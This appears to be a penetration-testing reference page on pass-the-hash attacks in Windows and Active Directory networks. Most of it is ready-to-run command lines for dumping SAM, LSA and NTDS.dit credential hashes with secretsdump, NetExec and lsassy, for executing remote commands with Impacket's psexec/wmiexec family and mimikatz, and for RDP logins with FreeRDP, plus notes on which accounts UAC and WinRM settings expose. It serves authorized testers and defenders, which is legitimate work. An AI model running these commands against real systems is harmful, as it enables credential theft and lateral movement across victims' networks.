An attacker knowing a user's NT hash can use it to authenticate over NTLM (pass-the-hash) (or indirectly over Kerberos with overpass-the-hash).

There are many tools that implement pass-the-hash: Impacket scripts (Python) (psexec, smbexec, secretsdump...), NetExec (Python), FreeRDP (C), mimikatz (C), lsassy (Python), pth-toolkit (Python) and many more.
=== "Credentials dumping"
    The Impacket script secretsdump (Python) has the ability to remotely dump hashes and LSA secrets from a machine
    ```bash
    secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
    secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
    secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
    ```
    NetExec (Python) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in BloodHound
    ```bash
    netexec smb $TARGETS -u $USER -H $NThash --sam --local-auth
    netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --lsa
    netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --ntds
    ```
    Lsassy (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in BloodHound. It works in standalone but also as a NetExec module
    ```bash
    netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy
    netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
    lsassy -u $USER -H $NThash $TARGETS
    lsassy -d $DOMAIN -u $USER -H $NThash $TARGETS
    ```
=== "Command execution"
    Some Impacket scripts enable testers to execute commands on target systems with pass-the-hash.
    ```bash
    psexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
    smbexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
    wmiexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
    atexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
    dcomexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
    ```
    NetExec (Python) has the ability to do it on a set of targets
    ```bash
    netexec winrm $TARGETS -d $DOMAIN -u $USER -p $PASSWORD -x whoami
    netexec smb $TARGETS --local-auth -u $USER -H $NThash -x whoami
    netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -x whoami
    ```
    On Windows, mimikatz (C) can pass-the-hash and open an elevated command prompt with `sekurlsa::pth`.
    ```bash
    sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NThash
    ```
=== "RDP access"
    [FreeRDP](https://github.com/FreeRDP/FreeRDP) (C) has the ability to do pass-the-hash for opening RDP sessions.
    ```bash
    xfreerdp /u:$USER /d:$DOMAIN /pth:'LMhash:NThash' /v:$TARGET /h:1010 /w:1920
    ```
!!! warning
    **UAC limits pass-the-hash**

    UAC (User Account Control) limits which local users can do remote administration operations. And since most of the attacks exploiting pass-the-hash rely on remote admin operations, it affects this technique.

    - the registry key `LocalAccountTokenFilterPolicy` is set to 0 by default. It means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to do remote administration tasks. Setting it to 1 allows the other local admins as well.
    - the registry key `FilterAdministratorToken` is set to 0 by default. It allows the built-in local admin account (RID-500, "Administrator") to do remote administration tasks. If set to 1, it doesn't.
    In short, by default, only the following accounts can fully take advantage of pass-the-hash:

    - local accounts : the built-in, RID-500, "Administrator" account
    - domain accounts : all domain accounts with local admin rights
!!! note
    **WinRM enables pass-the-hash**

    Testers should look out for environments with WinRM enabled. During the WinRM configuration, the `Enable-PSRemoting` sets the `LocalAccountTokenFilterPolicy` to 1, allowing all local accounts with admin privileges to do remote admin tasks, hence allowing those accounts to fully take advantage of pass-the-hash.

    **Machine accounts**

    Just like with any other domain account, a machine account's NT hash can be used with pass-the-hash, but it is not possible to operate remote operations that require local admin rights (such as SAM & LSA secrets dump). These operations can instead be conducted after crafting a Silver Ticket or doing S4U2self abuse, since the machine accounts validates Kerberos tickets used to authenticate to a said computer/service.

    A domain controller machine account's NT hash can be used with pass-the-hash to dump the domain hashes (NTDS.dit).